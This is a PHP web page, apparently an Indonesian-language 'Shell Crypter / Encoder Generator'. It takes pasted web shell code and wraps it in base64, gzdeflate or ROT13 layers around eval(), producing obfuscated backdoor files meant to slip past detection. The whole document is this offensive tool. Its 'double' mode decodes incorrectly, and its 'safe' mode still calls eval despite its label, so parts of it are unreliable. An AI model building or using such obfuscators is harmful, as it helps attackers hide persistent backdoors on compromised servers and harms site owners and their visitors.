<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = $_POST['shell'] ?? '';
    $method = $_POST['method'] ?? 'base64';

    $encoded = '';
    $final = '';

    switch ($method) {
        case 'base64':
            $encoded = base64_encode($code);
            $final = "<?php\neval(base64_decode(\"$encoded\"));\n?>";
            break;

        case 'gzinflate':
            $encoded = base64_encode(gzdeflate($code));
            $final = "<?php\neval(gzinflate(base64_decode(\"$encoded\")));\n?>";
            break;

        case 'rot13':
            $encoded = str_rot13($code);
            $final = "<?php\neval(str_rot13(\"$encoded\"));\n?>";
            break;

        case 'double':
            $encoded = base64_encode(gzdeflate(base64_encode($code)));
            $final = "<?php\neval(gzinflate(base64_decode(\"$encoded\")));\n?>";
            break;

        case 'safe':
            $encoded = base64_encode($code);
            $final = "<?php\n\$c=base64_decode('$encoded');eval(\$c);\n?>";
            break;
    }

    echo "<h3>🔥 Shell Ter-enkripsi ($method)</h3>";
    echo "<textarea style='width:100%;height:300px;'>$final</textarea>";
    echo "<br><button onclick=\"navigator.clipboard.writeText(document.querySelector('textarea').value)\">📋 Salin</button>";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Shell Crypter / Encoder Generator</title>
    <style>
        body { background:#121212; color:#eee; font-family:monospace; padding:30px; }
        textarea { width:100%; height:200px; background:#1e1e1e; color:#0f0; padding:10px; border:none; }
        select, button { margin-top:10px; padding:10px; background:#0df; border:none; font-weight:bold; }
    </style>
</head>
<body>

<h2>🧬 Shell Crypter / Encoder Generator</h2>

<form method="POST">
    <label>💻 Masukkan kode PHP (shell):</label>
    <textarea name="shell" placeholder="Contoh: <?php echo 'hacked'; ?>"></textarea>

    <br><label>🔐 Pilih metode encoding:</label><br>
    <select name="method">
        <option value="base64">Base64 + eval()</option>
        <option value="gzinflate">Gzinflate + Base64 + eval()</option>
        <option value="rot13">ROT13 + eval()</option>
        <option value="double">Double Encode (base64 + gzinflate)</option>
        <option value="safe">Base64 (tanpa eval langsung)</option>
    </select>

    <br><button type="submit">🚀 Encrypt Shell</button>
</form>

</body>
</html>